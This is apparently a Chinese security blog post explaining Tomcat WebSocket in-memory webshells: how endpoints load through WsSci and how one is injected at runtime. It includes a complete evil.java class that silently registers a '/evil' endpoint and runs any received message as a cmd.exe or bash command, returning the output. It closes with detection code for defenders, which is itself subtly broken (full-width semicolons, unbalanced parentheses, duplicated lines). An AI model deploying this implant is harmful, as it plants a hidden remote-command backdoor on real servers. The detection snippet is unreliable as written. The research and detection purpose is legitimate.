---
title: "Tomcat WebSocket内存马原理浅析"
date: 2022-07-19T00:58:30+08:00
draft: false
image: 
description: 
comments: true
license: true
math: false
categories:
- note
tags:
- 内存马
- Tomcat
---

本文首发跳跳糖：[《Tomcat WebSocket内存马原理浅析》](https://tttang.com/archive/1673/)

周末和N1k0la师傅看到了这个repo：[wsMemShell](https://github.com/veo/wsMemShell)，决定来研究一番。

正好某大行动要开始了，希望此文能抛砖引玉，给师傅们带来一些启发。文章写的不好，疏漏之处细节欢迎师傅们指正。

## Tomcat WebSocket的实现 

Tomcat自7.0.2版本开始支持WebSocket，采用自定义API，即WebSocketServlet。

从2013年有了`JSR356`标准之后，Tomcat自7.0.47版本废弃自定义的API，实现了Java WebSocket规范（JSR356 ）

根据JSR356规定， 建立WebSocket连接的服务器端和客户端，两端对称，可以互相通信。把通信端点抽象成类，就是`Endpoint`，每一个Endpoint对象代表WebSocket链接的一端，服务器端的叫`ServerEndpoint`，客户端的叫`ClientEndpoint`。客户端向服务端发送WebSocket握手请求，建立连接后就创建一个`ServerEndpoint`对象。

ServerEndpoint和ClientEndpoint，有相同的生命周期事件（OnOpen、OnClose、OnError、OnMessage），不同之处是ServerEndpoint作为服务器端点，可以指定一个URI路径供客户端连接，ClientEndpoint则没有。

Endpoint对象的生命周期方法如下：

- onOpen：当开启一个新的会话时调用。这是客户端与服务器握手成功后调用的方法，等同于注解@OnOpen。
- onClose：当会话关闭时调用。等同于注解@OnClose。
- onError：当链接过程中异常时调用。等同于注解@OnError。
- onMessage：接收到消息时触发。等同于注解@OnMessage

### 服务端实现Endpoint的方式

服务器端的`Endpoint`有两种实现方式，一种是注解方式`@ServerEndpoint`，一种是继承抽象类`Endpoint`。

#### 注解方式：@ServerEndpoint

官方文档：[ServerEndpoint (Java(TM) EE 7 Specification APIs)](https://docs.oracle.com/javaee/7/api/javax/websocket/server/ServerEndpoint.html)

一个@ServerEndpoint注解应该有以下元素：

- `value`：必要，String类型，此Endpoint部署的URI路径。
- `configurator`：非必要，继承ServerEndpointConfig.Configurator的类，主要提供ServerEndpoint对象的创建方式扩展（如果使用Tomcat的WebSocket实现，默认是反射创建ServerEndpoint对象）。
- `decoders`：非必要，继承Decoder的类，用户可以自定义一些消息解码器，比如通信的消息是一个对象，接收到消息可以自动解码封装成消息对象。
- `encoders`：非必要，继承Encoder的类，此端点将使用的编码器类的有序数组，定义解码器和编码器的好处是可以规范使用层消息的传输。
- `subprotocols`：非必要，String数组类型，用户在WebSocket协议下自定义扩展一些子协议。

比如：

```java
@ServerEndpoint(value = "/ws/{userId}", encoders = {MessageEncoder.class}, decoders = {MessageDecoder.class}, configurator = MyServerConfigurator.class)
```

@ServerEndpoint可以注解到任何类上，但是想实现服务端的完整功能，还需要配合几个生命周期的注解使用，这些生命周期注解只能注解在方法上：

- `@OnOpen` 建立连接时触发。
- `@OnClose` 关闭连接时触发。
- `@OnError` 发生异常时触发。
- `@OnMessage` 接收到消息时触发。

#### 继承抽象类：Endpoint

继承抽象类`Endpoint`，重写几个生命周期方法，实现两个接口，比加注解 `@ServerEndpoint`方式更麻烦。

其中重写`onMessage`需要实现接口`jakarta.websocket.MessageHandler`，给Endpoint分配URI路径需要实现接口`jakarta.websocket.server.ServerApplicationConfig`。

而`URI path`、`encoders`、`decoders`、`configurator`等配置信息由`jakarta.websocket.server.ServerEndpointConfig`管理，默认实现`jakarta.websocket.server.DefaultServerEndpointConfig`。

通过编程方式实现Endpoint，比如：

```java
ServerEndpointConfig serverEndpointConfig = ServerEndpointConfig.Builder.create(WebSocketServerEndpoint3.class, "/ws/{userId}").decoders(decoderList).encoders(encoderList).configurator(new MyServerConfigurator()).build();
```



## Tomcat WebSocket的加载

Tomcat提供了一个`javax.servlet.ServletContainerInitializer`的实现类`org.apache.tomcat.websocket.server.WsSci`。

> ServletContainerInitializer（SCI） 是 Servlet 3.0 新增的一个接口，主要用于在容器启动阶段通过编程风格注册Filter, Servlet以及Listener，以取代通过web.xml配置注册。这样就利于开发内聚的web应用框架.
>
> 具体可看：[Servlet3.0研究之ServletContainerInitializer接口](https://blog.csdn.net/lqzkcx3/article/details/78507169)

因此**Tomcat的WebSocket加载是通过SCI机制完成的**。

WsSci可以处理的类型有三种：

- 添加了注解@ServerEndpoint的类
- Endpoint的子类
- ServerApplicationConfig的实现类

Tomcat在Web应用启动时会在StandardContext的startInternal方法里通过 WsSci 的onStartup方法初始化 Listener 和 servlet，再扫描 classpath下带有注解@ServerEndpoint的类和Endpoint子类

如果当前应用存在ServerApplicationConfig实现，则通过ServerApplicationConfig获取Endpoint子类的配置（ServerEndpointConfig实例，包含了请求路径等信息）和符合条件的注解类，通过调用addEndpoint将结果注册到WebSocketContainer上；如果当前应用没有定义ServerApplicationConfig的实现类，那么WsSci默认只将所有扫描到的注解式Endpoint注册到WebSocketContainer。因此，如果采用可编程方式定义Endpoint，那么必须添加ServerApplicationConfig实现。

然后startInternal方法里为ServletContext添加一个过滤器`org.apache.tomcat.websocket.server.WsFilter`，它用于判断当前请求是否为WebSocket请求，以便完成握手（所以任何Tomcat都可以用[java-memshell-scanner](https://github.com/c0ny1/java-memshell-scanner)看到WsFilter）。



## Tomcat WebSocket内存马的实现

我们先来回顾一下servlet-api型内存马的实现步骤，拿Filter型举例：

1.  获取当前的StandardContext
2.  创建恶意Filter
3.  创建filterDef封装Filter对象，调用StandardContext.addFilterDef方法将filterDef添加到filterDefs
4.  创建filterMap将URL和filter进行绑定，调用StandardContext.addFilterMapBefore方法将filterMap添加到filterMaps中
5.  获取filterConfigs变量，并向其中添加filterConfig对象

既然要插入恶意Filter，那么我们就需要在Tomcat启动过程中寻找添加FIlter的方法，而filterDef、filterMap、filterConfigs都是StandardContext对象的属性，并且也有相应的add方法，那么我们就需要先获取StandardContext，再调用相应的方法。

WebSocket内存马也很类似，上一节提到了WsSci 的onStartup扫描 classpath下带有注解@ServerEndpoint的类和Endpoint子类，并且调用addEndpoint方法注册到WebSocketContainer上。那么我们应该从WebSocketContainer出发，而WsServerContainer是在StandardContext里面创建的，那么，显而易见的：

1. 获取当前的StandardContext
2. 通过StandardContext获取ServerContainer
3. 定义一个恶意类，并创建一个ServerEndpointConfig，给这个恶意类分配URI path
4. 调用ServerContainer.addEndpoint方法，将创建的ServerEndpointConfig添加进去

```java
ServerContainer container = (ServerContainer) req.getServletContext().getAttribute(ServerContainer.class.getName());
ServerEndpointConfig config = ServerEndpointConfig.Builder.create(evil.class, "/ws").build();
container.addEndpoint(config);
```

### demo

将注入内存马的操作放在static块，加载这个类即可实现内存马注入

evil.java:

```java
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.websocket.server.WsServerContainer;

import javax.websocket.*;
import javax.websocket.server.ServerContainer;
import javax.websocket.server.ServerEndpointConfig;
import java.io.InputStream;

public class evil extends Endpoint implements MessageHandler.Whole<String> {
    static {
        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
        ServerEndpointConfig build = ServerEndpointConfig.Builder.create(evil.class, "/evil").build();
        WsServerContainer attribute = (WsServerContainer) standardContext.getServletContext().getAttribute(ServerContainer.class.getName());
        try {
            attribute.addEndpoint(build);
            // System.out.println("ok!");
        } catch (DeploymentException e) {
            throw new RuntimeException(e);
        }
    }

    private Session session;

    public void onMessage(String message) {
        try {
            boolean iswin = System.getProperty("os.name").toLowerCase().startsWith("windows");
            Process exec;
            if (iswin) {
                exec = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", message});
            } else {
                exec = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", message});
            }

            InputStream ips = exec.getInputStream();
            StringBuilder sb = new StringBuilder();

            int i;
            while((i = ips.read()) != -1) {
                sb.append((char)i);
            }

            ips.close();
            exec.waitFor();
            this.session.getBasicRemote().sendText(sb.toString());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onOpen(Session session, EndpointConfig config) {
        this.session = session;
        this.session.addMessageHandler(this);
    }
}
```

效果：

![](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202207191826978.png)



## WebSocket内存马的检测方法

![](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202207200104113.png)

addEndpoint之后，可以在wsServerContainer里面有个configExactMatchMap属性里面找到Endpoint

只需要想办法拿到这个configExactMatchMap里面的config，然后就可以调用getPath等方法就可以拿到endpoint的各种属性，以此来判别是否为内存马

```java
public synchronized List<ServerEndpointConfig> getEndpointConfigs(HttpServletRequest request) throws Exception {
    ServerContainer sc = (ServerContainer) request.getServletContext().getAttribute(ServerContainer.class.getName());
    Field _configExactMatchMap = sc.getClass().getDeclaredField("configExactMatchMap");
    _configExactMatchMap.setAccessible(true);
    ConcurrentHashMap configExactMatchMap = (ConcurrentHashMap) _configExactMatchMap.get(sc);

    Class _ExactPathMatch = Class.forName("org.apache.tomcat.websocket.server.WsServerContainer$ExactPathMatch");
    Method _getconfig = _ExactPathMatch.getDeclaredMethod("getConfig");
    _getconfig.setAccessible(true);

    List<ServerEndpointConfig> configs = new ArrayList<>();
    Iterator<Map.Entry<String, Object>> iterator = configExactMatchMap.entrySet().iterator();

    while (iterator.hasNext()) {
        Map.Entry<String, Object> entry = iterator.next();
        ServerEndpointConfig config = (ServerEndpointConfig)_getconfig.invoke(entry.getValue());
        configs.add(config);
    }
    return configs;
}


configs = getEndpointConfigs(request);
for (ServerEndpointConfig cfg : configs) {
    System.out.println(cfg.getPath())；
    System.out.println(cfg.getEndpointClass().getName())；
    System.out.println(cfg.getEndpointClass().getClassLoader().getClass().getName())；
    System.out.println(classFileIsExists(cfg.getEndpointClass()))；
    System.out.println(cfg.getEndpointClass().getName())；
    System.out.println(cfg.getEndpointClass().getName())));
}
```

已PR到：[java-memshell-scanner](https://github.com/c0ny1/java-memshell-scanner)

说句题外话：有一说一，用Tomcat起WebSocket服务不是那么常见，如果发现了有注册的Endpoint的话，蓝队们还需要谨慎对待。

## 参考

[WebSocket 内存马，一种新型内存马技术](https://github.com/veo/wsMemShell)

[Servlet3.0研究之ServletContainerInitializer接口](https://blog.csdn.net/lqzkcx3/article/details/78507169)

[websocket之三：Tomcat的WebSocket实现 - duanxz](https://www.cnblogs.com/duanxz/p/5041110.html)

[WebSocket通信原理和在Tomcat中实现源码详解](https://blog.csdn.net/weixin_36586120/article/details/120025498)
